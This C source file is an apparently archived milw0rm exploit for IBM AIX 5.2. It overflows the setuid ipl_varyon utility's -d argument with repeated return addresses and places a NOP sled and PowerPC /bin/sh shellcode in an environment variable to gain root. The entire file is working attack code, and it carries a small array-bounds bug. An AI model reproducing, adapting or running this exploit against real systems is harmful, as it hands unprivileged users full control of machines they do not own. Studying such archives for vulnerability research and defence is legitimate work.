/*
 *
 *    IBM AIX ipl_varyon elevated privileges exploit
 *
 *    I just wanted to play with PowerPC (Tested on 5.2)
 *
 *    intropy (intropy <at> caughq.org)
 *
 */

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

#define DEBUG 1
#define BUFFERSIZE 2048
#define EGGSIZE 2048

#define NOP 0x60
#define ADDRESS 0x2ff22fff-(BUFFERSIZE/2)

/* lsd */
char shellcode_binsh[] =
"\x7c\xa5\x2a\x79"     /* xor.    r5,r5,r5             */
"\x40\x82\xff\xfd"     /* bnel    <shellcode>          */
"\x7f\xe8\x02\xa6"     /* mflr    r31                  */
"\x3b\xff\x01\x20"     /* cal     r31,0x120(r31)       */
"\x38\x7f\xff\x08"     /* cal     r3,-248(r31)         */
"\x38\x9f\xff\x10"     /* cal     r4,-240(r31)         */
"\x90\x7f\xff\x10"     /* st      r3,-240(r31)         */
"\x90\xbf\xff\x14"     /* st      r5,-236(r31)         */
"\x88\x5f\xff\x0f"     /* lbz     r2,-241(r31)         */
"\x98\xbf\xff\x0f"     /* stb     r5,-241(r31)         */
"\x4c\xc6\x33\x42"     /* crorc   cr6,cr6,cr6          */
"\x44\xff\xff\x02"     /* svca                         */
"/bin/sh"
"\x05";

unsigned long cex_load_environment(char *env_buffer, char *address_buffer, char *payload, int environment_size, int buffer_size) {
        int count, env_size = strlen(payload) + environment_size + 4 + 1;
        unsigned long address, *ret_addressp;

        if (DEBUG) printf("Adding nops to environment buffer...");
        for ( count = 0; count < env_size - strlen(payload) - 1; count++ ) {
            *(env_buffer++) = NOP;
        }
        if (DEBUG) printf("size %d...\n", count);
        if (DEBUG) printf("Adding payload to environment buffer...");
        for ( count = 0; count < strlen(payload); count++ ) {
            *(env_buffer++) = payload[count];
        }
        if (DEBUG) printf("size %d...\n", count);

        env_buffer[env_size - 1] = '\0';

        memcpy(env_buffer, "CAU=", 4);

	memset(address_buffer, 'A', buffer_size);

        address = ADDRESS;

        if (DEBUG) printf("Going for address @ 0x%lx\n", address);

        if (DEBUG) printf("Adding return address to buffer...");
        ret_addressp = (unsigned long *)(address_buffer+3);
        for ( count = 0; count < buffer_size; count += 4) {
                *(ret_addressp++) = address;
        }
        if (DEBUG) printf("size %d...\n", count);

        address_buffer[buffer_size - 1] = '\0';

        return( 0 );
}

int main()
{
    char *buffer, *egg;
    char *args[3], *envs[2];

    buffer = (char *)malloc(BUFFERSIZE);
    egg = (char *)malloc(EGGSIZE);

    cex_load_environment(egg, buffer, (char *)&shellcode_binsh, EGGSIZE, BUFFERSIZE);

    args[0] = "/usr/sbin/ipl_varyon";
    args[1] = "-d";
    args[2] = buffer;
    args[3] = NULL;

    envs[0] = egg;
    envs[1] = NULL;

    execve( "/usr/sbin/ipl_varyon", args, envs );

    return( 0 );
}

// milw0rm.com [2005-06-14]